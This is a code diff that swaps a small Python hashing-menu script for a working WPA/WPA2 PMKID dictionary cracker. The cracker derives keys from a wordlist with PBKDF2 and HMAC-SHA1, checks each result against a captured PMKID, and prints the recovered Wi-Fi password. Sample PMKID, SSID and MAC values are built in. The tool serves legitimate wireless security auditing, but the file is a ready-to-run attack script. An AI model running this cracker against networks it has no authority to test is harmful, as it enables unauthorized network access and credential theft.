@@ -1,32 +1,48 @@
-import hashlib
+import hashlib, hmac, struct, sys
 
-def hash_word():
-    print("Choose a hashing algorithm:")
-    print("1. MD5")
-    print("2. SHA-1")
-    print("3. SHA-256")
-    print("4. SHA-512")
-    
-    choice = input("Enter your choice (1-4): ")
-    word = input("ENTER WORD: ")
-    
-    if choice == "1":
-        hashed = hashlib.md5(word.encode('utf-8')).hexdigest()
-        algorithm = "MD5"
-    elif choice == "2":
-        hashed = hashlib.sha1(word.encode('utf-8')).hexdigest()
-        algorithm = "SHA-1"
-    elif choice == "3":
-        hashed = hashlib.sha256(word.encode('utf-8')).hexdigest()
-        algorithm = "SHA-256"
-    elif choice == "4":
-        hashed = hashlib.sha512(word.encode('utf-8')).hexdigest()
-        algorithm = "SHA-512"
-    else:
-        print("Invalid choice. Please select 1-4.")
-        return
-    
-    print(f"{algorithm} Hash:", hashed)
+# Default Values
+pmkid="000fac04c2ea9449c142e84a04790417"
+essid=b"WLAN-771698" 
+mac_ap=b"0012bf77162d" 
+mac_cl=b"0021e924a5e7" 
+passlist_src="wordlist.txt"
 
-# Call the function to run the tool
-hash_word()
+# User Supplied Values
+if len(sys.argv) > 1: pmkid=sys.argv[1]
+if len(sys.argv) > 2: essid=bytes(sys.argv[2], 'utf-8')
+if len(sys.argv) > 3: mac_ap = bytes.fromhex("".join(sys.argv[3].replace("-", ":").split(":")))
+if len(sys.argv) > 4: mac_cl = bytes.fromhex("".join(sys.argv[4].replace("-", ":").split(":")))
+if len(sys.argv) > 5: passlist_src=sys.argv[5]
+
+# Read passlist.txt into a python list
+with open(passlist_src, 'r') as f:
+  passlist = f.read().splitlines()
+
+def crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist):
+    print('\033[95m')
+    print("PMKID:                    ", pmkid)
+    print("SSID:                     ", essid.decode())
+    print("AP MAC Address:           ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_ap))
+    print("Client MAC Address:       ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
+    print('\x1b[0m')
+
+    proceed = input("Attempt crack with these settings? (y/n): ")
+    if proceed in ["y", ""]: pass 
+    else: return
+    print('\033[1m' + '\33[33m' + "Attempting to crack password...\n" + '\x1b[0m')
+
+    for password in passlist:
+        pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), essid, 4096, 32)
+        try_pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]
+        if (try_pmkid == pmkid):
+            print('\033[92m' + try_pmkid, "- Matches captured PMKID\n")
+            print("Password Cracked!\n" + '\x1b[0m')
+            print("SSID:             ", essid.decode())
+            print("Password:         ", password, "\n")
+            return
+        print(try_pmkid)
+
+    print('\033[91m' + "\nFailed to crack password. " + 
+          "It may help to try a different passwords list. " + '\x1b[0m' + "\n")
+
+crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist)
